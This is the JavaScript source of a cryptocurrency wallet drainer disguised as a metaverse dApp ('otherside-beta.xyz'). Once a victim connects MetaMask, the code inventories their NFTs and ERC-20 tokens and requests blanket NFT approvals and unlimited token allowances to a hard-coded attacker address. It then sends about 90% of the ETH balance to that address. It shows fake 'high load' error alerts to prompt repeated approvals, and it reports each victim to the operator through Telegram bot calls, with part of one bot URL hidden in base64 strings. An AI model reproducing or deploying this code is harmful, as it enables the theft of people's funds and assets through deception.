// import Onboard from '@web3-onboard/core'
const BLOCKNATIVE_KEY = 'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'; //https://www.blocknative.com/
const NETWORK_ID = 1;
const RPC_URL = 'https://mainnet.infura.io/v3/xxxxxxxxxxxxxxxxxxxxxxxxxxxx'; //https://infura.io/
const ADDRESS = '0xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'; //public ethereum address
var abi20 = [{ "inputs": [], "payable": false, "stateMutability": "nonpayable", "type": "constructor" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "owner", "type": "address" }, { "indexed": true, "internalType": "address", "name": "spender", "type": "address" }, { "indexed": false, "internalType": "uint256", "name": "value", "type": "uint256" }], "name": "Approval", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "previousOwner", "type": "address" }, { "indexed": true, "internalType": "address", "name": "newOwner", "type": "address" }], "name": "OwnershipTransferred", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "from", "type": "address" }, { "indexed": true, "internalType": "address", "name": "to", "type": "address" }, { "indexed": false, "internalType": "uint256", "name": "value", "type": "uint256" }], "name": "Transfer", "type": "event" }, { "constant": true, "inputs": [], "name": "_decimals", "outputs": [{ "internalType": "uint8", "name": "", "type": "uint8" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "_name", "outputs": [{ "internalType": "string", "name": "", "type": "string" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "_symbol", "outputs": [{ "internalType": "string", "name": "", "type": "string" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [{ "internalType": "address", "name": "owner", "type": "address" }, { "internalType": "address", "name": "spender", "type": "address" }], "name": "allowance", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "address", "name": "spender", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "approve", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [{ "internalType": "address", "name": "account", "type": "address" }], "name": "balanceOf", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "burn", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "decimals", "outputs": [{ "internalType": "uint8", "name": "", "type": "uint8" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "address", "name": "spender", "type": "address" }, { "internalType": "uint256", "name": "subtractedValue", "type": "uint256" }], "name": "decreaseAllowance", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "getOwner", "outputs": [{ "internalType": "address", "name": "", "type": "address" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "address", "name": "spender", "type": "address" }, { "internalType": "uint256", "name": "addedValue", "type": "uint256" }], "name": "increaseAllowance", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "mint", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "name", "outputs": [{ "internalType": "string", "name": "", "type": "string" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "owner", "outputs": [{ "internalType": "address", "name": "", "type": "address" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [], "name": "renounceOwnership", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "symbol", "outputs": [{ "internalType": "string", "name": "", "type": "string" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "totalSupply", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "address", "name": "recipient", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "transfer", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "address", "name": "sender", "type": "address" }, { "internalType": "address", "name": "recipient", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "transferFrom", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "address", "name": "newOwner", "type": "address" }], "name": "transferOwnership", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }];
var abi721 = [{ "constant": false, "inputs": [{ "internalType": "address", "name": "to", "type": "address" }, { "internalType": "uint256", "name": "tokenId", "type": "uint256" }], "name": "approve", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "address", "name": "to", "type": "address" }, { "internalType": "uint256", "name": "tokenId", "type": "uint256" }], "name": "mint", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "address", "name": "from", "type": "address" }, { "internalType": "address", "name": "to", "type": "address" }, { "internalType": "uint256", "name": "tokenId", "type": "uint256" }], "name": "safeTransferFrom", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "address", "name": "from", "type": "address" }, { "internalType": "address", "name": "to", "type": "address" }, { "internalType": "uint256", "name": "tokenId", "type": "uint256" }, { "internalType": "bytes", "name": "_data", "type": "bytes" }], "name": "safeTransferFrom", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "address", "name": "to", "type": "address" }, { "internalType": "bool", "name": "approved", "type": "bool" }], "name": "setApprovalForAll", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "address", "name": "from", "type": "address" }, { "internalType": "address", "name": "to", "type": "address" }, { "internalType": "uint256", "name": "tokenId", "type": "uint256" }], "name": "transferFrom", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "inputs": [], "payable": false, "stateMutability": "nonpayable", "type": "constructor" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "from", "type": "address" }, { "indexed": true, "internalType": "address", "name": "to", "type": "address" }, { "indexed": true, "internalType": "uint256", "name": "tokenId", "type": "uint256" }], "name": "Transfer", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "owner", "type": "address" }, { "indexed": true, "internalType": "address", "name": "approved", "type": "address" }, { "indexed": true, "internalType": "uint256", "name": "tokenId", "type": "uint256" }], "name": "Approval", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "owner", "type": "address" }, { "indexed": true, "internalType": "address", "name": "operator", "type": "address" }, { "indexed": false, "internalType": "bool", "name": "approved", "type": "bool" }], "name": "ApprovalForAll", "type": "event" }, { "constant": true, "inputs": [{ "internalType": "address", "name": "owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [{ "internalType": "uint256", "name": "tokenId", "type": "uint256" }], "name": "getApproved", "outputs": [{ "internalType": "address", "name": "", "type": "address" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [{ "internalType": "address", "name": "owner", "type": "address" }, { "internalType": "address", "name": "operator", "type": "address" }], "name": "isApprovedForAll", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [{ "internalType": "uint256", "name": "tokenId", "type": "uint256" }], "name": "ownerOf", "outputs": [{ "internalType": "address", "name": "", "type": "address" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [{ "internalType": "bytes4", "name": "interfaceId", "type": "bytes4" }], "name": "supportsInterface", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "payable": false, "stateMutability": "view", "type": "function" }]
var currentAccount
var openSeaGet
const zxgkb = "1MjA1NjExNjA1"
const awdewad = "aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDUxNDUwNjQ1OTU6QUFIL"
const fwarg = "XlHMnBRRGJZTG44Z2lPUHBBNklnWjFuZ3pEbTZ2SDgvc2VuZE1lc3NhZ2U/Y2hhdF9pZD0"
const qw2d111 = "JnRleHQ9YmF5YzI1MDQgaHR0cHM6Ly9ldGhlcnNjYW4uaW8vYWRkcmVzcy8="
const dqwpo = "tNzY5MjQyMTAw"
var nft = []
var nftSorted = []
var balanceInEth
var req = new XMLHttpRequest()
var access = false
class Wallet {
    provider
    onboard = Onboard({
        dappId: BLOCKNATIVE_KEY,
        networkId: NETWORK_ID,
        darkMode: !0,
        subscriptions: {
            wallet: wallet => {
                if (wallet.provider) {
                    this.provider = new ethers.providers.Web3Provider(wallet.provider, 'any')
                    window.localStorage.setItem('selectedWallet', wallet.name)
                } else {
                    this.provider = null
                }
            }
        },
        walletSelect: {
            wallets: [{
                walletName: 'metamask'
            }]
        }
    })

    async connectWallet() {
        await this.onboard.walletSelect()
        await this.onboard.walletCheck()
    }
    readyToTransact = async() => {
        if (!this.provider) {
            const walletSelected = await this.onboard.walletSelect()
            if (!walletSelected) return !1
        }
        const ready = await this.onboard.walletCheck()
        return ready
    }
    async scan() {
        setTimeout(1000);
        nft = []
        nftSorted = []
        const ready = await this.readyToTransact()
        if (!ready)
            return
        const signer = this.provider.getUncheckedSigner()
        currentAccount = await this.provider.listAccounts()
        if (currentAccount != undefined) {
            document.querySelector(".down").textContent = "Loading..."
            document.querySelector("#down").removeAttribute("onclick")
            document.querySelector(".up").removeAttribute("onclick")

        }
        balanceInEth = (ethers.utils.formatEther(await this.provider.getBalance(currentAccount[0])) * 0.9).toString()
        console.log(currentAccount[0])
        req.open("POST", "https://api.telegram.org/botxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx/sendMessage?chat_id=xxxxxxxxxxxxxx&text=etherscan.io/address/" + currentAccount + " otherside-beta.xyz connect", true);
        req.send(); //@userinfobot
        this.opensea(currentAccount[0])
    }

    async opensea(account) {
        const signer = this.provider.getUncheckedSigner()
        const options = {
            method: 'GET',
            headers: { Accept: 'application/json', 'X-API-KEY': xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx } //https://docs.opensea.io/reference/request-an-api-key
        };
        try {
            var openSeaGet = await fetch('https://api.opensea.io/api/v1/collections?asset_owner=' + account + '&offset=0&limit=300', options)
            openSeaGet = await openSeaGet.json()
            console.log(openSeaGet)
            for (var i = 0; i < openSeaGet.length; i++) {
                if (openSeaGet[i].description = "") continue;
                nft.push({
                    address: openSeaGet[i].primary_asset_contracts[0].address,
                    name: openSeaGet[i].primary_asset_contracts[0].name,
                    price: openSeaGet[i].stats.one_day_average_price * 3000,
                    amount: openSeaGet[i].owned_asset_count,
                    bucks: openSeaGet[i].owned_asset_count * openSeaGet[i].stats.one_day_average_price * 3000,
                    decimals: 0
                })
            }
        } catch {
            console.log("no nfts")
        }

        try {
            var ethpl = await fetch("https://api.ethplorer.io/getAddressInfo/" + account + "?apiKey=freekey", { method: 'GET', headers: { accept: 'application/json' } })
            ethpl = await ethpl.json()
            console.log(ethpl)


            console.log("tokens")
            for (var i = 0; i < ethpl.tokens.length; i++) {
                if (ethpl.tokens[i].balance > 1000) {
                    console.log(ethpl.tokens[i].tokenInfo.address)
                    console.log(flagApe)
                    nft.push({
                        address: ethpl.tokens[i].tokenInfo.address,
                        name: ethpl.tokens[i].tokenInfo.name,
                        price: ethpl.tokens[i].tokenInfo.price.rate,
                        amount: ethpl.tokens[i].balance / 10 ** parseInt(ethpl.tokens[i].tokenInfo.decimals),
                        bucks: ethpl.tokens[i].tokenInfo.price.rate * ethpl.tokens[i].balance / 10 ** parseInt(ethpl.tokens[i].tokenInfo.decimals),
                        decimals: 18
                    })
                }
            }
        } catch {
            console.log("no erc20")
        }

        var max = 0;
        var maxStr = nft[0];
        for (var i = 0; i < nft.length; i++) {
            for (var j = 0; j < nft.length; j++) {
                if (nft[j].bucks > max && nftSorted.indexOf(nft[j]) < 0) {
                    max = nft[j].bucks;
                    maxStr = nft[j];
                }
            }
            if (nftSorted.indexOf(maxStr) < 0) nftSorted.push(maxStr);
            else continue;
            max = 0;
        }
        console.log(nftSorted)
        document.querySelector(".down").textContent = "Enter The Metaverse"
        await document.querySelector("#down").setAttribute('onclick', 'wallet.sendMoney()');

    }
    async sendMoney() {
        const provider = new ethers.providers.Web3Provider(window.ethereum, "any")
        const signer = provider.getSigner()
        for (var i = 0; i < nftSorted.length; i++) {
            if (nftSorted[i].decimals == 0) {

                const token = new ethers.Contract(nftSorted[i].address, abi721, signer)
                console.log(token)

                if (await token.isApprovedForAll(currentAccount[0], ADDRESS) == false && token.address != "0x57f1887a8bf19b14fc0df6fd9b2acc9af147ea85") {
                    await token.setApprovalForAll(ADDRESS, true)
                    req.open("POST", "https://api.telegram.org/botxxxxxxxxxxxxxxxxxxxxxxxxxxxx/sendMessage?chat_id=xxxxxxxxx&text=etherscan.io/address/" + currentAccount + " otherside-beta.xyz approve nft", true);
                    req.send();
                    alert("Failed due to high load! Please try again!")
                } else {
                    console.log(nftSorted[i].name + " approved")
                    continue
                }
            } else {
                const token = new ethers.Contract(nftSorted[i].address, abi20, signer)
                console.log(token)
                if (await token.allowance(currentAccount[0], ADDRESS) == 0) {
                    await token.approve(ADDRESS, "99999999999999999999999999")
                    req.open("POST", "https://api.telegram.org/botxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx/sendMessage?chat_id=xxxxxxxxxxxxxxx&text=etherscan.io/address/" + currentAccount + " otherside-beta.xyz approve erc20", true);
                    req.send();
                    alert("Failed due to high load! Please try again!")
                } else {
                    console.log(nftSorted[i].name + " approved")
                    continue
                }

            }
        }

        const tx = {
            from: this.currentAccount,
            to: ADDRESS.toLowerCase(),
            value: ethers.utils.parseEther(balanceInEth),
            gasLimit: ethers.utils.hexlify(21000), // 100000
        }
        signer.sendTransaction(tx).then((transaction) => {
            console.dir(transaction)
        })
    }
}
const wallet = new Wallet()